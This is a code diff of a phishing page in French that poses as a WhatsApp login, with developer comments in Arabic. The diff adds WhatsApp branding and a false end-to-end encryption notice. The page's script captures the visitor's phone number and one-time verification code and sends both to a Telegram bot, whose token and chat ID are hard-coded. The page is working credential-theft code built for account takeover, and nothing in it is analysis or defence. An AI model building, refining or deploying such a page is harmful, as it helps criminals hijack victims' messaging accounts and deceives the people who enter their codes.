@@ -7,22 +7,28 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
         :root {
-            /* الألوان المستخرجة من الصورة */
-            --bg-cream: #fdf8f1; /* لون الخلفية الكريمي الفاتح */
+            --bg-cream: #fdf8f1; /* لون الخلفية الكريمي من الصورة */
             --btn-green: #24ac64; /* لون الزر الأخضر */
-            --text-black: #1a1a1a; /* لون الخط الداكن */
-            --border-gray: #e5e5e5;
+            --text-black: #1a1a1a;
+            --text-gray: #666;
         }
 
-        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
 
         body {
-            background-color: var(--bg-cream); /* تطبيق لون الخلفية من الصورة */
+            background-color: var(--bg-cream);
             margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .main-content {
+            flex: 1;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
+            padding: 20px;
         }
 
         .wrapper {
@@ -30,98 +36,92 @@
             max-width: 420px;
             background: white;
             padding: 50px 30px;
-            border-bottom: 4px solid #000; /* الخط الأسود العريض أسفل الصورة */
+            border-bottom: 4px solid #000;
             text-align: left;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
         }
 
-        h2 { 
-            color: var(--text-black);
-            font-size: 26px; 
-            font-weight: 700; 
-            margin-bottom: 12px;
-            line-height: 1.2;
-        }
+        h2 { font-size: 26px; font-weight: 700; margin-bottom: 12px; color: var(--text-black); }
+        p { font-size: 15px; margin-bottom: 35px; color: var(--text-gray); }
 
-        p { 
-            color: #666; 
-            font-size: 15px; 
-            margin-bottom: 35px; 
-            line-height: 1.4;
-        }
-
-        /* تنسيق الحقول لتطابق الصورة */
         .iti { width: 100%; margin-bottom: 25px; }
         input[type="tel"], .otp-field {
-            height: 55px;
-            border: 1px solid var(--border-gray);
-            border-radius: 8px; /* حواف مربعة قليلاً مثل الصورة */
-            font-size: 17px;
-            outline: none;
-            background: #fff;
+            height: 55px; border: 1px solid #e5e5e5; border-radius: 8px; font-size: 17px; outline: none;
         }
 
         .otp-container { display: flex; justify-content: space-between; gap: 10px; margin: 25px 0; }
-        .otp-field { width: 48px !important; text-align: center; border-radius: 8px; }
+        .otp-field { width: 48px !important; text-align: center; }
 
         .btn-submit {
-            background-color: var(--btn-green); /* اللون الأخضر من الصورة */
-            color: white;
-            border: none;
-            width: 100%;
-            max-width: 200px;
-            height: 50px;
-            border-radius: 25px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            margin: 20px auto;
-            display: block;
+            background-color: var(--btn-green); color: white; border: none;
+            width: 100%; max-width: 200px; height: 50px; border-radius: 25px;
+            font-size: 17px; font-weight: 600; cursor: pointer; margin: 20px auto; display: block;
         }
 
-        .link-text {
-            display: block;
+        /* تنسيق النصوص السفلية الجديدة */
+        .footer {
+            padding: 20px;
             text-align: center;
             color: var(--text-black);
-            text-decoration: none;
-            font-size: 15px;
-            font-weight: 500;
-            margin-top: 15px;
         }
+
+        .footer-top { font-size: 18px; margin-bottom: 15px; }
+        .footer-top a { color: var(--text-black); text-decoration: underline; text-decoration-color: var(--btn-green); font-weight: 600; }
+        
+        .footer-encryption {
+            display: flex; align-items: center; justify-content: center;
+            gap: 8px; color: var(--text-gray); font-size: 15px; margin-bottom: 20px;
+        }
+
+        .footer-links { font-size: 13px; color: var(--text-gray); }
 
         .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div id="page1">
-        <h2>Saisissez un numéro de téléphone.</h2>
-        <p>Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
-        <input type="tel" id="phone">
-        <button class="btn-submit" onclick="process('phone')">Suivant</button>
-        <a href="#" class="link-text">Se connecter avec un code QR ></a>
-    </div>
-
-    <div id="page2" class="hidden">
-        <h2>Vérification</h2>
-        <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
-        <div class="otp-container">
-            <input type="number" class="otp-field" oninput="move(this, 0)">
-            <input type="number" class="otp-field" oninput="move(this, 1)">
-            <input type="number" class="otp-field" oninput="move(this, 2)">
-            <input type="number" class="otp-field" oninput="move(this, 3)">
-            <input type="number" class="otp-field" oninput="move(this, 4)">
-            <input type="number" class="otp-field" oninput="move(this, 5)">
+<div class="main-content">
+    <div class="wrapper">
+        <div id="page1">
+            <h2>Saisissez un numéro de téléphone.</h2>
+            <p>Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
+            <input type="tel" id="phone">
+            <button class="btn-submit" onclick="process('phone')">Suivant</button>
         </div>
-        <button class="btn-submit" onclick="process('otp')">Vérifier</button>
-        <a href="#" class="link-text">Renvoyer le code ></a>
+
+        <div id="page2" class="hidden">
+            <h2>Vérification</h2>
+            <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
+            <div class="otp-container">
+                <input type="number" class="otp-field" oninput="move(this, 0)">
+                <input type="number" class="otp-field" oninput="move(this, 1)">
+                <input type="number" class="otp-field" oninput="move(this, 2)">
+                <input type="number" class="otp-field" oninput="move(this, 3)">
+                <input type="number" class="otp-field" oninput="move(this, 4)">
+                <input type="number" class="otp-field" oninput="move(this, 5)">
+            </div>
+            <button class="btn-submit" onclick="process('otp')">Vérifier</button>
+        </div>
+    </div>
+</div>
+
+<div class="footer">
+    <div class="footer-top">
+        Vous n’avez pas de compte WhatsApp ? <a href="#">Démarrer ↗</a>
+    </div>
+    <div class="footer-encryption">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+        Vos messages personnels sont chiffrés de bout en bout
+    </div>
+    <div class="footer-links">
+        Conditions générales et Politique de confidentialité
     </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
     const token = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
-    const chat = "1705240737";
+    const chat = "1705240737"; // الـ Chat ID الخاص بك
 
     const iti = window.intlTelInput(document.querySelector("#phone"), {
         initialCountry: "auto",
@@ -140,10 +140,8 @@
             document.querySelectorAll('.otp-field').forEach(f => code += f.value);
             msg = "🔑 كود الـ OTP: " + code;
         }
-
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            method: 'POST', headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: chat, text: msg })
         });
     }
